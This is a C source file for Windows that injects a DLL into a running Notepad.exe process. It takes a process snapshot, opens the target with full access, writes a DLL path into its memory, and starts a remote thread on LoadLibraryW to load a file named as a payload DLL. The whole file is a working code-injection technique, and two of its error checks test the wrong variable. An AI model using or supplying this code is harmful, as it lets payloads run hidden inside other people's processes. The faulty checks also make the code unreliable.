#include <Windows.h>
#include <tlhelp32.h>
#include "misc.h"

#define PROCNAME L"Notepad.exe"
#define DLLNAME L"C:/<full path>/local-payload-execution-dll.dll"


int main()
{
	HANDLE hSnapShot = NULL;
	PROCESSENTRY32 pe32 = { 0 };

	BOOL bRet = FALSE;

	DWORD dwProcessId = 0;
	HANDLE hProcess = NULL;

	LPVOID pLoadLibraryW = NULL;
	LPVOID pParameter = NULL;

	HANDLE hThread = NULL;


	do
	{
		wprintf(L"[i] Collecting processes info... ");
		hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		if (hSnapShot == INVALID_HANDLE_VALUE)
		{
			printError(L"CreateToolhelp32Snapshot");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"[i] Looking for process \"%s\" PID... ", PROCNAME);
		pe32.dwSize = sizeof(PROCESSENTRY32);

		bRet = Process32First(hSnapShot, &pe32);
		if (!bRet)
		{
			printError(L"Process32First");
			break;
		}

		do
		{
			if (wcscmp(pe32.szExeFile, PROCNAME) == 0)
			{
				dwProcessId = pe32.th32ProcessID;
				break;
			}

			bRet = Process32Next(hSnapShot, &pe32);
		} while (bRet);

		if (dwProcessId == 0)
		{
			wprintf(L"not found\n");
			break;
		}
		wprintf(L"%d\n", dwProcessId);

		wprintf(L"[i] Opening process handle... ");
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
		if (hProcess == NULL)
		{
			printError(L"OpenProcess");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"[i] Finding LoadLibraryW address... ");
		pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
		if (hProcess == NULL)
		{
			printError(L"GetProcAddress");
			break;
		}
		wprintf(L"0x%p\n", pLoadLibraryW);

		wprintf(L"[i] Allocating memory for LoadLibraryW parameter... ");
		pParameter = VirtualAllocEx(hProcess, NULL, sizeof(DLLNAME), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (pParameter == NULL)
		{
			printError(L"VirtualAllocEx");
			break;
		}
		wprintf(L"0x%p\n", pParameter);

		wprintf(L"[i] Writing LoadLibraryW parameter... ");
		bRet = WriteProcessMemory(hProcess, pParameter, DLLNAME, sizeof(DLLNAME), NULL);
		if (!bRet)
		{
			printError(L"WriteProcessMemory");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"[i] Loading DLL to remote process... ");
		hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pLoadLibraryW, pParameter, NULL, NULL);
		if (!bRet)
		{
			printError(L"CreateRemoteThread");
			break;
		}
		wprintf(L"done\n");

	}  while (FALSE);

	return 0;
}